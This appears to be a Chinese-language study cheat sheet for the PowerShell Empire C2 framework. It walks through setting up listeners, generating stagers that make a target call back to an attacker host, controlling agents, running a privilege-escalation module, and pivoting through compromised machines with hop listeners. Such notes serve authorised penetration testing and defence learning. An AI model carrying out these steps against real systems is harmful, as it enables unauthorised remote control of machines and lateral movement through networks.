#### C2 框架：Empire (C2 Framework: Empire)

Powershell Empire 是一个功能齐全的后渗透 C2 (Command and Control) 框架。

##### 安装与设置

- **安装**:
    
    Bash
    
    ```
    sudo apt install powershell-empire starkiller
    ```
    
- **启动服务器**: 必须先启动 Empire 服务器，客户端才能连接。
    
    Bash
    
    ```
    sudo powershell-empire server
    ```
    
- **连接客户端**:
    
    - **CLI 客户端**: `powershell-empire client`
        
    - **Starkiller (GUI)**: 启动 `starkiller` 并使用默认凭证 (`empireadmin`:`password123`) 登录到 `https://localhost:1337`。
        

##### 核心组件

- **监听器 (Listeners)**: 在 C2 服务器上打开端口，等待来自受感染主机的连接。
    
- **载荷 (Stagers)**: 用于在目标上执行的一小段代码，其作用是连接到监听器并下载完整的代理。
    
- **代理 (Agents)**: 建立在受感染主机上的 C2 会话，类似于 Metasploit 的 "session"。
    
- **模块 (Modules)**: 通过代理执行的后渗透工具（如权限提升、凭证窃取等）。
    

##### 步骤一：设置监听器 (Step 1: Setting up a Listener)

- **Empire CLI**:
    
    ```
    uselistener http
    set Name myhttp
    set Host <YOUR_IP>
    set Port 8080
    execute
    listeners
    ```
    
- **Starkiller GUI**:
    
    1. 在 `Listeners` 菜单中，点击 `Create`。
        
    2. 选择 `http` 类型。
        
    3. 填写 `Name`, `Host`, `Port` 等选项。
        
    4. 点击 `Submit`。
        

##### 步骤二：生成载荷 (Step 2: Generating a Stager)

- **Empire CLI**:
    
    ```
    usestager multi/bash
    set Listener myhttp
    execute
    ```
    
    生成的载荷会显示在终端中。
    
- **Starkiller GUI**:
    
    1. 在 `Stagers` 菜单中，点击 `Create`。
        
    2. 选择 `multi/bash` 类型。
        
    3. 在 `Listener` 下拉菜单中选择你创建的监听器。
        
    4. 点击 `Submit`，然后在列表中复制生成的载荷。
        

##### 步骤三：获取并交互代理 (Step 3: Getting and Interacting with an Agent)

在目标主机上执行上一步生成的载荷（通常是一个 PowerShell 或 Bash one-liner）。

- **Empire CLI**:
    
    ```
    # 查看已连接的代理
    agents
    # 与代理交互
    interact <AGENT_NAME>
    # 在代理上下文中输入 help 查看可用命令
    help
    ```
    
- **Starkiller GUI**:
    
    - 新的代理会出现在 `Agents` 菜单中。
        
    - 点击代理名称或 `Pop-out` 按钮即可打开交互界面，执行命令、浏览文件系统等。
        

##### 模块使用 (Using Modules)

- **Empire CLI**:
    
    ```
    # 在代理上下文中
    usemodule powershell/privesc/sherlock
    options
    execute
    ```
    
- **Starkiller GUI**:
    
    1. 在 `Modules` 菜单中搜索并选择模块。
        
    2. 点击 `Use Module`，选择要执行该模块的代理。
        
    3. 点击 `Submit`。结果会显示在 `Reporting` 菜单中。
        

##### 跳板攻击：跳转监听器 (Pivoting: Hop Listeners)

`http_hop` 监听器可以将一台受感染的主机变成一个 C2 中继（跳板机）。

1. **创建 HTTP 监听器**: 首先，创建一个常规的 HTTP 监听器（如 `myhttp`），用于接收最终的连接。
    
2. **创建跳转监听器**:
    
    - **类型**: `http_hop`
        
    - **Host**: 设置为**跳板机**的 IP 地址。
        
    - **RedirectListener**: 设置为第一步中创建的常规 HTTP 监听器（`myhttp`）。
        
3. **部署跳转文件**: 创建跳转监听器后，Empire 会生成一组 `.php` 文件。你需要将这些文件上传到跳板机，并使用 Web 服务器（如 `php -S 0.0.0.0:<PORT>`）将其托管起来。
    
4. **生成载荷**: 创建一个指向**跳转监听器**的载荷，并在最终的目标上执行。最终目标的流量会通过跳板机中转，再回到你的 C2 服务器。